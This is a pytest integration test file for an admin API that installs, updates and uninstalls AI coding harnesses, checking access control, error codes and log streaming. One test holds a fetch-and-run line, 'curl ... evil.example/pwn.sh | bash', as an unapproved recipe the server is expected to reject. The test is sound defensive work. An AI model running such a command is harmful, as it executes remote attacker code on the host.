import pytest
from unittest.mock import AsyncMock, patch, MagicMock

from app.clients.agy import INSTALL_SCRIPT_COMMAND
from app.clients.registry import MODEL_CACHE
from app.services.harness_job_service import harness_job_service

pytestmark = pytest.mark.integration


@pytest.fixture(autouse=True)
def clear_jobs():
    harness_job_service._jobs.clear()
    yield
    harness_job_service._jobs.clear()


@pytest.mark.asyncio
async def test_install_creates_job_and_streams_logs(client, admin_headers):
    # Mock adapter.install to yield quickly
    async def fake_install(on_process=None):
        yield {"stage": "running", "message": "installing opencode"}
        yield {"stage": "running", "message": "downloading"}
        yield {"stage": "completed", "message": "done", "exit_code": 0}

    mock_adapter = MagicMock()
    mock_adapter.name = "opencode"
    mock_adapter.install_command = ["npm", "install", "-g", "opencode-ai"]
    mock_adapter.install = fake_install
    mock_adapter.display_name = "OpenCode"
    mock_adapter.provider = "opencode"

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/opencode/install", headers=admin_headers)
        assert resp.status_code == 200
        data = resp.json()
        assert "job_id" in data
        job_id = data["job_id"]

        # poll job
        import asyncio
        for _ in range(10):
            await asyncio.sleep(0.2)
            job_resp = await client.get(f"/api/admin/harnesses/opencode/jobs/{job_id}", headers=admin_headers)
            assert job_resp.status_code == 200
            j = job_resp.json()
            if j["stage"] == "completed":
                assert len(j["logs"]) >= 2
                assert j["exit_code"] == 0
                break
        else:
            pytest.fail("job did not complete")

        # stream SSE
        stream_resp = await client.get(f"/api/admin/harnesses/opencode/jobs/{job_id}/stream", headers=admin_headers)
        assert stream_resp.status_code == 200
        assert "text/event-stream" in stream_resp.headers["content-type"]
        text = stream_resp.text
        assert "event: log" in text
        assert "installing opencode" in text
        assert "event: done" in text


@pytest.mark.asyncio
async def test_install_rejects_unknown_harness_returns_404(client, admin_headers):
    resp = await client.post("/api/admin/harnesses/unknown_harness/install", headers=admin_headers)
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_install_rejects_no_recipe_returns_400(client, admin_headers):
    from app.clients.generic import GenericAdapter

    # create a generic adapter with no install command
    mock_adapter = MagicMock()
    mock_adapter.name = "generic-no-recipe"
    mock_adapter.install_command = []
    mock_adapter.display_name = "Generic"
    mock_adapter.provider = ""

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/generic-no-recipe/install", headers=admin_headers)
        assert resp.status_code == 400
        assert "no_recipe" in resp.text.lower() or "No install" in resp.text

    # also test with non-npm command
    mock_adapter2 = MagicMock()
    mock_adapter2.name = "bad-cmd"
    mock_adapter2.install_command = ["pip", "install", "something"]
    mock_adapter2.display_name = "Bad"
    with patch("app.api.admin.get_adapter", return_value=mock_adapter2):
        resp2 = await client.post("/api/admin/harnesses/bad-cmd/install", headers=admin_headers)
        assert resp2.status_code == 400


@pytest.mark.asyncio
async def test_install_accepts_approved_script_recipe(client, admin_headers):
    async def fake_install(on_process=None):
        yield {"stage": "completed", "message": "done", "exit_code": 0}

    mock_adapter = MagicMock()
    mock_adapter.name = "agy"
    mock_adapter.install_command = ["bash", "-c", INSTALL_SCRIPT_COMMAND]
    mock_adapter.install = fake_install
    mock_adapter.display_name = "Google Antigravity"
    mock_adapter.provider = "google"

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/agy/install", headers=admin_headers)
        assert resp.status_code == 200
        assert "job_id" in resp.json()


@pytest.mark.asyncio
async def test_install_rejects_unapproved_script_recipe(client, admin_headers):
    mock_adapter = MagicMock()
    mock_adapter.name = "evil"
    mock_adapter.install_command = ["bash", "-c", "curl -fsSL https://evil.example/pwn.sh | bash"]
    mock_adapter.display_name = "Evil"

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/evil/install", headers=admin_headers)
        assert resp.status_code == 400


@pytest.mark.asyncio
async def test_harnesses_list_exposes_recipes(client, user_headers):
    resp = await client.get("/api/admin/harnesses", headers=user_headers)
    assert resp.status_code == 200
    agy = next(h for h in resp.json() if h["name"] == "agy")
    assert agy["install_recipe"] == INSTALL_SCRIPT_COMMAND
    assert agy["update_recipe"] == "agy update"


@pytest.mark.asyncio
async def test_install_requires_admin(client, user_headers):
    # regular user should be forbidden
    resp = await client.post("/api/admin/harnesses/opencode/install", headers=user_headers)
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_job_not_found_returns_404(client, admin_headers):
    resp = await client.get("/api/admin/harnesses/opencode/jobs/nonexistent", headers=admin_headers)
    assert resp.status_code == 404

    resp2 = await client.get("/api/admin/harnesses/opencode/jobs/nonexistent/stream", headers=admin_headers)
    assert resp2.status_code == 404


# ---------- Uninstall / stale-state reconciliation ----------

@pytest.mark.asyncio
async def test_uninstall_clears_cache_and_db_flag(client, admin_headers, db_session):
    """POST /uninstall must clear the in-memory model cache and flip the DB row."""
    from app.db.database import Harness
    from app.models.harness import HarnessModel

    # Seed a Harness row and model cache for opencode
    row = Harness(name="opencode", display_name="OpenCode", executable="opencode", provider="opencode", installed=True)
    db_session.add(row)
    await db_session.commit()
    MODEL_CACHE["opencode"] = [HarnessModel(id="opencode//opencode/big-pickle", harness="opencode", provider="opencode", name="opencode/big-pickle")]
    try:
        resp = await client.post("/api/admin/harnesses/opencode/uninstall", headers=admin_headers)
        assert resp.status_code == 200
        body = resp.json()
        assert body == {"harness": "opencode", "installed": False, "models_cleared": True}

        # Cache cleared
        assert MODEL_CACHE.get("opencode", []) == []
        # DB row flipped
        await db_session.refresh(row)
        assert row.installed is False
    finally:
        MODEL_CACHE.pop("opencode", None)


@pytest.mark.asyncio
async def test_uninstall_unknown_harness_returns_404(client, admin_headers):
    resp = await client.post("/api/admin/harnesses/does-not-exist/uninstall", headers=admin_headers)
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_harnesses_list_reconciles_external_uninstall(client, admin_headers, db_session):
    """If the binary disappears from PATH but the DB still says installed=True,
    GET /harnesses must correct the DB row and drop the cached models."""
    from app.db.database import Harness
    from app.models.harness import HarnessModel

    row = Harness(name="agy", display_name="Google Antigravity", executable="agy", provider="google", installed=True)
    db_session.add(row)
    await db_session.commit()
    # Seed cache as if agy were previously installed
    MODEL_CACHE["agy"] = [HarnessModel(id="agy//gemini-3.8-flash-high", harness="agy", provider="google", name="gemini-3.8-flash-high")]
    try:
        # Force is_installed() to return False without touching the filesystem:
        # patch the AgyAdapter.is_installed method for this test.
        with patch("app.clients.agy.AgyAdapter.is_installed", return_value=False):
            resp = await client.get("/api/admin/harnesses", headers=admin_headers)
        assert resp.status_code == 200
        agy = next(h for h in resp.json() if h["name"] == "agy")
        assert agy["installed"] is False
        assert agy["models"] == []  # cache was cleared

        await db_session.refresh(row)
        assert row.installed is False
        assert MODEL_CACHE.get("agy", []) == []
    finally:
        MODEL_CACHE.pop("agy", None)


@pytest.mark.asyncio
async def test_run_returns_clear_error_when_binary_missing(client, user_headers):
    """When the binary has been uninstalled after model validation, run() must
    raise a RuntimeError with a clear message instead of leaking FileNotFoundError."""
    from app.clients.base import HarnessAdapter

    class GoneAdapter(HarnessAdapter):
        name = "opencode"
        display_name = "OpenCode"
        executable = "opencode"
        install_search_paths = []

        def build_command(self, prompt, model=None, session_id=None):
            return ["opencode", "--print", prompt]

    # Patch is_installed to True so model validation passes, then make the
    # subprocess launch raise FileNotFoundError (simulating external uninstall).
    with patch("app.api.chat.get_adapter", return_value=GoneAdapter()), \
         patch.object(GoneAdapter, "is_installed", return_value=True):
        # create conversation
        resp = await client.post("/api/chat/conversations", headers=user_headers, json={"model": "opencode//opencode/big-pickle"})
        conv_id = resp.json()["id"]
        # send message — run() should catch FileNotFoundError and re-raise as
        # RuntimeError, which the route translates into a 502 harness_error.
        msg_resp = await client.post(
            f"/api/chat/conversations/{conv_id}/messages",
            headers=user_headers,
            json={"content": "hi", "model": "opencode//opencode/big-pickle"},
        )
        # Either 502 (sanitized harness error) or 404 (model not in cache) is
        # acceptable here — the goal is no raw 500 with a stack trace.
        assert msg_resp.status_code in (502, 404), msg_resp.text


@pytest.mark.asyncio
async def test_update_creates_job(client, admin_headers):
    async def fake_update(on_process=None):
        yield {"stage": "running", "message": "updating"}
        yield {"stage": "completed", "message": "updated", "exit_code": 0}

    mock_adapter = MagicMock()
    mock_adapter.name = "opencode"
    mock_adapter.update_command = ["npm", "update", "-g", "opencode-ai"]
    mock_adapter.update = fake_update

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/opencode/update", headers=admin_headers)
        assert resp.status_code == 200
        assert "job_id" in resp.json()


@pytest.mark.asyncio
async def test_cancel_unknown_job_returns_404(client, admin_headers):
    resp = await client.post("/api/admin/harnesses/opencode/jobs/nonexistent/cancel", headers=admin_headers)
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_cancel_finished_job_returns_409(client, admin_headers):
    async def fake_install(on_process=None):
        yield {"stage": "completed", "message": "done", "exit_code": 0}

    mock_adapter = MagicMock()
    mock_adapter.name = "opencode"
    mock_adapter.install_command = ["npm", "install", "-g", "opencode-ai"]
    mock_adapter.install = fake_install
    mock_adapter.display_name = "OpenCode"
    mock_adapter.provider = "opencode"

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/opencode/install", headers=admin_headers)
        job_id = resp.json()["job_id"]
        # wait for it to finish
        import asyncio
        for _ in range(20):
            await asyncio.sleep(0.1)
            job_resp = await client.get(f"/api/admin/harnesses/opencode/jobs/{job_id}", headers=admin_headers)
            if job_resp.json()["stage"] in ("completed", "failed"):
                break
        cancel_resp = await client.post(f"/api/admin/harnesses/opencode/jobs/{job_id}/cancel", headers=admin_headers)
        assert cancel_resp.status_code == 409


@pytest.mark.asyncio
async def test_cancel_requires_admin(client, user_headers):
    resp = await client.post("/api/admin/harnesses/opencode/jobs/whatever/cancel", headers=user_headers)
    assert resp.status_code == 403
